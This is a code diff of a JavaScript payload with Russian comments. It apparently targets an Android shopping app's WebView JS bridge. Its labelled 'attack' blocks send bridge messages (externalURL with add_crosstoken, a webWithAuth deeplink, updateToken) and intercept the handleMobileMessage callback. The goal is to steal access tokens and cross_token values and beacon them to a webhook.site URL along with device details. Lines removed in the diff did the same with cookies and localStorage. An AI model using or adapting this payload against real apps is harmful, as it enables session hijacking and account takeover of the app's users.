@@ -40,52 +40,91 @@
     // ЗАМЕНИ НА СВОЙ WEBHOOK.SITE URL
     var WEBHOOK = 'https://webhook.site/52dbaa1f-6ce3-490d-b01b-32f3ed2b7fe9/44b7c6e1-4edb-49c8-ad62-1f56ae074e3a';
 
-    // === Метод 1: Перехват handleMobileMessage ===
-    // Приложение вызывает window.handleMobileMessage(data)
-    // для передачи событий в WebView, включая tokenUpdated с access-token
+    // ============================================
+    // АТАКА 1: externalURL с add_crosstoken=true
+    // JS bridge попросит приложение загрузить
+    // наш URL с cross_token в query string
+    // ============================================
+    try {
+        if (typeof Android !== 'undefined' && Android.postMessage) {
+            Android.postMessage(JSON.stringify({
+                event: 'externalURL',
+                payload: {
+                    url: WEBHOOK + '?method=externalURL_crosstoken&add_crosstoken=true'
+                }
+            }));
+            new Image().src = WEBHOOK + '?method=bridge_externalURL&status=sent';
+        }
+    } catch(e) {
+        new Image().src = WEBHOOK + '?method=bridge_externalURL&error=' + encodeURIComponent(e.message);
+    }
+
+    // ============================================
+    // АТАКА 2: deeplink → webWithAuth → наш URL
+    // Через JS bridge вызываем deeplink который
+    // добавит cross_token к нашему URL
+    // ============================================
+    try {
+        if (typeof Android !== 'undefined' && Android.postMessage) {
+            Android.postMessage(JSON.stringify({
+                event: 'deeplink',
+                payload: {
+                    url: 'magnit://webWithAuth?url=' + encodeURIComponent(WEBHOOK + '?method=deeplink_crosstoken') + '&in_app=true'
+                }
+            }));
+            new Image().src = WEBHOOK + '?method=bridge_deeplink&status=sent';
+        }
+    } catch(e) {
+        new Image().src = WEBHOOK + '?method=bridge_deeplink&error=' + encodeURIComponent(e.message);
+    }
+
+    // ============================================
+    // АТАКА 3: updateToken — запрос обновления токена
+    // После обновления приложение вызовет
+    // handleMobileMessage с новым токеном
+    // ============================================
+    try {
+        if (typeof Android !== 'undefined' && Android.postMessage) {
+            Android.postMessage(JSON.stringify({
+                event: 'updateToken'
+            }));
+            new Image().src = WEBHOOK + '?method=bridge_updateToken&status=sent';
+        }
+    } catch(e) {}
+
+    // ============================================
+    // ПЕРЕХВАТ: handleMobileMessage
+    // После updateToken приложение вызовет этот callback
+    // с JSON {"type":"tokenUpdated","token":"eyJ..."}
+    // ============================================
     window.handleMobileMessage = function(data) {
-        // data = JSON строка вида {"type":"tokenUpdated","token":"eyJ..."}
         new Image().src = WEBHOOK + '?method=handleMobileMessage&data=' + encodeURIComponent(data);
     };
 
-    // === Метод 2: JS Bridge Android.postMessage() ===
-    // Пробуем дёрнуть bridge чтобы приложение ответило с токеном
+    // ============================================
+    // АТАКА 4: options — получить инфу об устройстве
+    // ============================================
     try {
         if (typeof Android !== 'undefined' && Android.postMessage) {
-            // Отправляем команду, которую WebProgramJsInterface обработает
             Android.postMessage(JSON.stringify({
-                type: 'getToken'
+                event: 'options'
             }));
-            Android.postMessage(JSON.stringify({
-                type: 'tokenRequest'
-            }));
-            // Фиксируем что bridge доступен
-            new Image().src = WEBHOOK + '?method=jsBridge&status=available';
+            new Image().src = WEBHOOK + '?method=bridge_options&status=sent';
         }
-    } catch(e) {
-        new Image().src = WEBHOOK + '?method=jsBridge&error=' + encodeURIComponent(e.message);
-    }
+    } catch(e) {}
 
-    // === Метод 3: Читаем cross_token если он в URL ===
-    // Работает если вызвано через webWithAuth
+    // ============================================
+    // ПЕРЕХВАТ: cross_token из URL (если webWithAuth)
+    // ============================================
     var params = new URLSearchParams(window.location.search);
     var crossToken = params.get('cross_token');
     if (crossToken) {
         new Image().src = WEBHOOK + '?method=crossToken&token=' + encodeURIComponent(crossToken);
     }
 
-    // === Метод 4: Перехват cookie и localStorage ===
-    try {
-        var cookies = document.cookie;
-        var storage = JSON.stringify(localStorage);
-        if (cookies || storage !== '{}') {
-            new Image().src = WEBHOOK + '?method=storage&cookies='
-                + encodeURIComponent(cookies)
-                + '&localStorage=' + encodeURIComponent(storage);
-        }
-    } catch(e) {}
-
-    // === Метод 5: Информация об окружении ===
+    // ============================================
+    // INFO: окружение
+    // ============================================
     new Image().src = WEBHOOK + '?method=info'
         + '&url=' + encodeURIComponent(window.location.href)
         + '&ua=' + encodeURIComponent(navigator.userAgent)
